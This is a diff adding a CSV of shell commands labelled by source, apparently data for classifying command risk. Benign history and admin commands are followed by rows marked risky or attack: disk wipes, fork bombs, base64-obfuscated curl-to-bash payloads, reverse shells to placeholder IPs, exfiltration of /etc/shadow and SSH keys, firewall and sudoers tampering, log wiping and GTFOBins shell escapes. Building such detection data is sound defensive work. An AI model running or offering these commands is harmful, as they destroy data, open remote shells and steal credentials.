@@ -1,0 +1,301 @@
+command,source
+ls,bash_history
+ls -la,bash_history
+ls -lh /var/log,bash_history
+cd ~,bash_history
+cd ..,bash_history
+cd /var/www,bash_history
+pwd,bash_history
+git status,bash_history
+git add .,bash_history
+"git commit -m ""fix bug in parser""",bash_history
+git push origin main,bash_history
+git pull origin main,bash_history
+git log --oneline -10,bash_history
+git diff HEAD~1,bash_history
+git branch -a,bash_history
+git checkout -b feature/login,bash_history
+git clone https://github.com/example/repo.git,bash_history
+git stash,bash_history
+git stash pop,bash_history
+git fetch --all,bash_history
+git merge feature-branch,bash_history
+git rebase main,bash_history
+git tag v1.0.0,bash_history
+pip install requests,bash_history
+pip list,bash_history
+pip freeze > requirements.txt,bash_history
+pip show numpy,bash_history
+pip install -r requirements.txt,bash_history
+pip uninstall requests -y,bash_history
+python3 script.py,bash_history
+python3 -m venv venv,bash_history
+source venv/bin/activate,bash_history
+deactivate,bash_history
+"python3 -c ""print('hello')""",bash_history
+df -h,bash_history
+du -sh *,bash_history
+du -h --max-depth=1,bash_history
+top,bash_history
+htop,bash_history
+free -m,bash_history
+free -h,bash_history
+uname -a,bash_history
+whoami,bash_history
+id,bash_history
+uptime,bash_history
+ps aux,bash_history
+ps -ef | grep python,bash_history
+kill 1234,bash_history
+history,bash_history
+alias ll='ls -la',bash_history
+export PATH=$PATH:/usr/local/bin,bash_history
+echo $HOME,bash_history
+cat /etc/os-release,bash_history
+less /var/log/syslog,bash_history
+tail -f /var/log/syslog,bash_history
+tail -n 100 /var/log/auth.log,bash_history
+"grep -r ""TODO"" .",bash_history
+"find . -name ""*.py""",bash_history
+mkdir project,bash_history
+touch file.txt,bash_history
+cp file.txt backup.txt,bash_history
+mv old.txt new.txt,bash_history
+rm file.txt,bash_history
+chmod +x script.sh,bash_history
+chown user:user file.txt,bash_history
+tar -czvf archive.tar.gz folder/,bash_history
+unzip file.zip,bash_history
+curl https://api.github.com,bash_history
+wget https://example.com/file.txt,bash_history
+ssh user@host,bash_history
+scp file.txt user@host:/tmp/,bash_history
+ping -c 4 google.com,bash_history
+ifconfig,bash_history
+ip a,bash_history
+netstat -tulnp,bash_history
+nano file.txt,bash_history
+vim file.txt,bash_history
+code .,bash_history
+docker ps,bash_history
+docker images,bash_history
+docker-compose up -d,bash_history
+docker build -t app .,bash_history
+npm install,bash_history
+npm run build,bash_history
+npm start,bash_history
+node app.js,bash_history
+yarn install,bash_history
+make,bash_history
+make install,bash_history
+cmake ..,bash_history
+gcc file.c -o file,bash_history
+python3 -m http.server 8000,bash_history
+clear,bash_history
+"echo ""hello world""",bash_history
+which python3,bash_history
+env,bash_history
+systemctl status nginx,sysadmin_docs
+systemctl restart ssh,sysadmin_docs
+systemctl enable docker,sysadmin_docs
+systemctl stop apache2,sysadmin_docs
+systemctl daemon-reload,sysadmin_docs
+systemctl is-active nginx,sysadmin_docs
+journalctl -xe,sysadmin_docs
+journalctl -u nginx --since today,sysadmin_docs
+journalctl -f,sysadmin_docs
+journalctl --disk-usage,sysadmin_docs
+apt update,sysadmin_docs
+apt upgrade -y,sysadmin_docs
+apt install curl,sysadmin_docs
+apt list --installed,sysadmin_docs
+apt-cache search python3,sysadmin_docs
+apt remove nginx,sysadmin_docs
+sudo apt autoremove,sysadmin_docs
+apt-get update,sysadmin_docs
+apt-get install -y python3-pip,sysadmin_docs
+man ls,sysadmin_docs
+crontab -l,sysadmin_docs
+crontab -e,sysadmin_docs
+date,sysadmin_docs
+cal,sysadmin_docs
+chmod -R 777 /var/www,synthetic_risky
+chmod -R 777 ~/project,synthetic_risky
+chmod -R 777 /opt/app,synthetic_risky
+chmod -R 777 /srv/data,synthetic_risky
+chmod -R 777 ./build,synthetic_risky
+chmod -R 777 /home/user/site,synthetic_risky
+chmod 777 /etc/passwd,synthetic_risky
+chmod 777 ~/.ssh,synthetic_risky
+chmod -R 777 /var/www/html,synthetic_risky
+chmod -R 777 /usr/local/app,synthetic_risky
+chmod -R 777 .,synthetic_risky
+chmod -R 777 /mnt/data,synthetic_risky
+chmod -R 777 /tmp/uploads,synthetic_risky
+chmod -R 777 /home/deploy/releases,synthetic_risky
+chmod 777 id_rsa,synthetic_risky
+rm -rf ./build,synthetic_risky
+rm -rf node_modules,synthetic_risky
+rm -rf /home/user/project/old_version,synthetic_risky
+rm -rf ~/Downloads/*,synthetic_risky
+rm -rf /tmp/*,synthetic_risky
+rm -rf .git,synthetic_risky
+rm -rf $HOME/.cache,synthetic_risky
+rm -rf /var/cache/apt/*,synthetic_risky
+rm -rf dist/,synthetic_risky
+rm -rf venv/,synthetic_risky
+rm -rf __pycache__,synthetic_risky
+rm -rf /var/log/*.old,synthetic_risky
+rm -rf /opt/app/old_release,synthetic_risky
+rm -rf /home/deploy/backups/2023,synthetic_risky
+rm -rf target/,synthetic_risky
+"tar czf - /home/user | ssh user@remote ""cat > backup.tar.gz""",synthetic_risky
+"tar -cf - /var/www | ssh backup@server ""tar xf - -C /backup""",synthetic_risky
+scp -r /etc user@remote:/tmp/etc_backup,synthetic_risky
+rsync -av /home/user/ user@remote:/backup/,synthetic_risky
+scp -r ~/.ssh user@remote:/tmp/keys_backup,synthetic_risky
+"tar czf - /var/log | ssh 203.0.113.5 ""cat > logs.tar.gz""",synthetic_risky
+rsync -avz /var/www/ backupuser@203.0.113.10:/mnt/backup/,synthetic_risky
+scp /etc/shadow user@remote:/tmp/,synthetic_risky
+tar -cvf - /home | nc 203.0.113.20 4444,synthetic_risky
+rsync -av --delete /home/ user@remote:/mirror/,synthetic_risky
+kill -9 $(pgrep python),synthetic_risky
+kill -9 -1,synthetic_risky
+for pid in $(pgrep node); do kill -9 $pid; done,synthetic_risky
+while true; do kill -9 1234; done,synthetic_risky
+killall -9 java,synthetic_risky
+pkill -9 -f python,synthetic_risky
+kill -9 $(pgrep -f nginx),synthetic_risky
+for pid in $(pgrep -f worker); do kill -9 $pid; done,synthetic_risky
+pkill -9 node,synthetic_risky
+kill -9 $(ps -ef | grep java | awk '{print $2}'),synthetic_risky
+wget http://example.com/tool.tar.gz && tar xzf tool.tar.gz,synthetic_risky
+wget http://example.com/pkg.tar.gz -O - | tar xz -C /opt,synthetic_risky
+curl http://example.com/build.tar.gz -o build.tar.gz && tar -xzf build.tar.gz -C /usr/local,synthetic_risky
+wget http://198.51.100.5/app.zip && unzip app.zip -d /opt/app,synthetic_risky
+curl -O http://example.com/module.tar.gz && tar xf module.tar.gz -C /lib,synthetic_risky
+wget http://203.0.113.7/patch.tar.gz -O - | tar x -C /,synthetic_risky
+curl http://example.com/plugin.zip -o plugin.zip && unzip -o plugin.zip -d /var/www/plugins,synthetic_risky
+wget http://example.com/lib.so.tar.gz && tar xzf lib.so.tar.gz -C /usr/lib,synthetic_risky
+curl -L http://example.com/release.tar.gz | tar xz -C /opt/release,synthetic_risky
+wget http://example.com/update.tar.gz && tar --overwrite -xzf update.tar.gz -C /etc,synthetic_risky
+iptables -F,synthetic_risky
+ufw disable,synthetic_risky
+systemctl stop firewalld,synthetic_risky
+systemctl disable ufw,synthetic_risky
+iptables -P INPUT ACCEPT,synthetic_risky
+setenforce 0,synthetic_risky
+sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config,synthetic_risky
+chmod 777 /etc/sudoers,synthetic_risky
+usermod -aG sudo guestuser,synthetic_risky
+passwd -d root,synthetic_risky
+git push --force origin main,synthetic_risky
+git reset --hard HEAD~5,synthetic_risky
+git clean -fdx,synthetic_risky
+git branch -D release,synthetic_risky
+history -c,synthetic_risky
+unset HISTFILE,synthetic_risky
+export HISTSIZE=0,synthetic_risky
+truncate -s 0 /var/log/auth.log,synthetic_risky
+cat /dev/null > ~/.bash_history,synthetic_risky
+shred -n 1 access.log,synthetic_risky
+docker run --privileged -v /:/host alpine chroot /host,synthetic_risky
+sudo npm install -g some-package,synthetic_risky
+sudo pip install package-from-untrusted-source,synthetic_risky
+"(crontab -l; echo ""* * * * * curl http://example.com/check.sh | bash"") | crontab -",synthetic_risky
+docker run --cap-add=ALL ubuntu bash,synthetic_risky
+sudo chmod -R 777 /usr/bin,synthetic_risky
+"echo ""user ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers",synthetic_risky
+"mount -o remount,rw /",synthetic_risky
+dd if=/dev/zero of=testfile.img bs=1M count=100,synthetic_risky
+mkfs.vfat /dev/sdb1,synthetic_risky
+dd if=/dev/zero of=/dev/sda,synthetic_attack
+dd if=/dev/urandom of=/dev/sdb bs=1M,synthetic_attack
+dd if=/dev/zero of=/dev/nvme0n1,synthetic_attack
+dd if=/dev/random of=/dev/sda bs=512 count=1,synthetic_attack
+dd if=/dev/zero of=/dev/sda bs=1M count=1000,synthetic_attack
+dd if=/dev/zero of=/dev/sdc conv=notrunc,synthetic_attack
+dd if=/dev/zero of=/dev/mapper/vg0-root,synthetic_attack
+dd if=/dev/urandom of=/dev/sda1,synthetic_attack
+dd if=/dev/zero of=/dev/hda,synthetic_attack
+dd if=/dev/zero of=/dev/sda bs=4096 count=100000,synthetic_attack
+dd if=/dev/zero of=/dev/vda,synthetic_attack
+dd if=/dev/random of=/dev/sdb1,synthetic_attack
+dd if=/dev/zero of=/dev/sda2,synthetic_attack
+dd if=/dev/zero of=/dev/xvda,synthetic_attack
+dd if=/dev/urandom of=/dev/sda bs=1M count=500,synthetic_attack
+mkfs.ext4 /dev/sda,synthetic_attack
+mkfs.ntfs /dev/sdb,synthetic_attack
+mkfs -t ext4 /dev/sda1,synthetic_attack
+mkfs.xfs /dev/sda,synthetic_attack
+mkfs.ext4 /dev/nvme0n1,synthetic_attack
+mkfs.vfat /dev/sda,synthetic_attack
+mkfs.btrfs /dev/sda1,synthetic_attack
+mkfs.ext3 /dev/vda,synthetic_attack
+wipefs -a /dev/sda,synthetic_attack
+mkfs.ext4 -F /dev/sda1,synthetic_attack
+:(){ :|:& };:,synthetic_attack
+bomb(){ bomb|bomb& };bomb,synthetic_attack
+.(){ .|.& };.,synthetic_attack
+perl -e 'fork while fork',synthetic_attack
+"python3 -c ""while True: __import__('os').fork()""",synthetic_attack
+bash -c ':(){ :|:& };:',synthetic_attack
+:(){ : & : & };:,synthetic_attack
+while true; do $0 & done,synthetic_attack
+:(){ :&:&};:,synthetic_attack
+ruby -e 'loop { fork }',synthetic_attack
+echo Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g= | base64 -d | bash,synthetic_attack
+curl -s http://example.com/payload.b64 | base64 -d | sh,synthetic_attack
+"echo ""d2dldCBodHRwOi8vZXZpbC5jb20vbWFsIC1PIC90bXAvbQ=="" | base64 --decode | bash",synthetic_attack
+wget -qO- http://example.com/enc.txt | base64 -d | bash,synthetic_attack
+"printf '%s' ""Y3VybCBldmlsLmNvbS9zaGVsbC5zaCB8IHNo"" | base64 -d | sh",synthetic_attack
+curl http://198.51.100.9/stage2.b64 -s | base64 -D | bash,synthetic_attack
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx | base64 -d | bash,synthetic_attack
+cat payload.b64 | base64 -d | bash,synthetic_attack
+curl -s http://203.0.113.15/x | base64 -d > /tmp/x.sh && bash /tmp/x.sh,synthetic_attack
+"echo ""cm0gLXJmIC8="" | base64 -d | sh",synthetic_attack
+curl -s http://example.com/install.sh | bash,synthetic_attack
+curl http://example.com/setup.sh | sh,synthetic_attack
+wget -qO- http://example.com/init.sh | bash,synthetic_attack
+curl -fsSL http://198.51.100.20/run.sh | sudo bash,synthetic_attack
+wget -O - http://203.0.113.30/script.sh | sh,synthetic_attack
+curl http://evil.example/x.sh | bash -s --,synthetic_attack
+bash <(curl -s http://example.com/x.sh),synthetic_attack
+sh <(wget -qO- http://example.com/x.sh),synthetic_attack
+curl -sSL http://example.com/miner.sh | bash,synthetic_attack
+wget http://example.com/dropper.sh -O- | bash,synthetic_attack
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,gtfobins
+vim -c ':!/bin/sh',gtfobins
+"awk 'BEGIN {system(""/bin/sh"")}'",gtfobins
+find . -exec /bin/sh \; -quit,gtfobins
+"python3 -c ""import os; os.system('/bin/sh')""",gtfobins
+tar czf archive.tar.gz --use-compress-program=/bin/sh,gtfobins
+"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")' ",gtfobins
+"awk 'BEGIN {system(""id"")}'",gtfobins
+"find / -name ""*.conf"" -exec /bin/sh -p \; -quit",gtfobins
+"perl -e 'exec ""/bin/sh"";'",gtfobins
+less /etc/passwd -e '!/bin/sh',gtfobins
+nmap --interactive,gtfobins
+"python3 -c ""import pty; pty.spawn('/bin/sh')""",gtfobins
+env /bin/sh,gtfobins
+tar -xf archive.tar --to-command=/bin/sh,gtfobins
+rm -rf /,synthetic_attack
+rm -rf --no-preserve-root /,synthetic_attack
+rm -rf /etc,synthetic_attack
+rm -rf /boot,synthetic_attack
+rm -rf /var,synthetic_attack
+rm -rf /usr,synthetic_attack
+rm -rf /*,synthetic_attack
+sudo rm -rf /,synthetic_attack
+rm -rf / --no-preserve-root,synthetic_attack
+chmod -R 777 /,synthetic_attack
+nc -e /bin/sh 203.0.113.50 4444,synthetic_attack
+bash -i >& /dev/tcp/203.0.113.50/4444 0>&1,synthetic_attack
+"python3 -c ""import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.50',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])""",synthetic_attack
+mkfifo /tmp/f; nc 203.0.113.50 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1,synthetic_attack
+ncat 203.0.113.50 4444 -e /bin/bash,synthetic_attack
+"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:203.0.113.50:4444",synthetic_attack
+"php -r '$sock=fsockopen(""203.0.113.50"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");' ",synthetic_attack
+rm -rf / && history -c,synthetic_attack
+curl -s http://203.0.113.99/wipe.sh | bash,synthetic_attack
+dd if=/dev/zero of=/dev/sda bs=1M && reboot -f,synthetic_attack
